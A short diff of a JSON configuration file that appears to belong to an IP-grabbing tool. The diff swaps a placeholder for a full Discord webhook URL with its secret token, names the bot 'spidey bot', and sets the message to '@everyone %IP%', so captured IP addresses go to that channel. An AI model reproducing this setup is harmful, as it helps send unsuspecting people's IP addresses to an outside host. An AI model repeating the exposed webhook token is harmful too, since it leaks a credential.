@@ -1,6 +1,6 @@
 {
-  "webhook": "YOUR_WEBHOOK_URL_HERE",
-  "webhook_name": "webhook",
+  "webhook": "https://discord.com/api/webhooks/1222063736336945182/DOdl682mrn1VTE33xvuerMxL6mqBGJTLV05noNkoWr-ijI6_7lbGlwR_ydJDvXFQTFRB",
+  "webhook_name": "spidey bot",
   "webhook_avatar": "https://cdn.discordapp.com/embed/avatars/0.png",
   "message": "@everyone %IP%",
 
